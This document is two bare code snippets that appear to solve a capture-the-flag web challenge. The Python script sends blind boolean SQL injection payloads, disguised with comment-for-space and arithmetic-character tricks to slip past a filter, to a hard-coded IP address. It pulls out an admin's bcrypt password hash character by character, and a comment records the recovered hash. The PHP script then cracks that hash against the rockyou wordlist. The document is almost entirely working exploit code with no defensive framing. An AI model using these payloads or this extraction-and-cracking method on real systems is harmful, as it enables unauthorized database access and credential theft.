```
import subprocess
begin_payload = "name=or/**/(admin=1/**/and/**/length(username)=5/**/and/**/substring(username,1,1)=char(97)and/**/substring(username,2,1)=char(99+1)and/**/substring(username,3,1)=char(111-2)and/**/substring(username,4,1)=char(99+6)and/**/substring(username,5,1)=char(111-1)and/**/length(password)=61-1/**/"
end_payload = ")#"
prefix = 'and/**/ord(substring(password,{},1))='
char_ = '{}'

# $2y$10$oy/MsMTJOzuoIDstubShI.kH8Ec6yvoRMNdT2bNCDtSCqu.9qUUd2
password = ''
from tqdm import trange
for i in range(1, 61):
	payload = begin_payload + prefix.format(str(i) if i % 10 else str(i+1)+"-1") + char_ + end_payload
	broken = False
	for count in range(31, 127):
		if count < 100 and count % 10 == 0:
				f = str(count+1)+"-1"
		elif count == 120:
			f = "119+1"
		elif count == 109:
			f = '111-2'
		elif count == 110:
			f = '111-1'
		elif 100 <= count <= 108:
			f = '99+' + str(count-99)
		else:
			f = str(count)

		# print(payload.format(f))
		ret = subprocess.run(["curl", "-s", "--location", "--request", "POST", "http://172.104.49.143:1322",
			"--header", "Content-Type: application/x-www-form-urlencoded",
			"--data-urlencode", "search_user_exist=",
			"--data-urlencode", "username=\\",
			"--data-urlencode", payload.format(f)
		], stdout=subprocess.PIPE).stdout.decode().strip()
		if ret == "No user":
			count += 1
		else:
			print(ret)
			password += chr(count)
			print("Password: \"" + password + '"')
			broken = True
			break
print(password)

```


```
<?php
$filename = 'rockyou.txt';
$contents = file($filename);
$hashed = '$2y$10$oy/MsMTJOzuoIDstubShI.kH8Ec6yvoRMNdT2bNCDtSCqu.9qUUd2';
foreach($contents as $line) {
    if (password_verify(hash('sha256', trim($line), true), $hashed)) {
         echo $line;
         break;
    }
}
?>
```
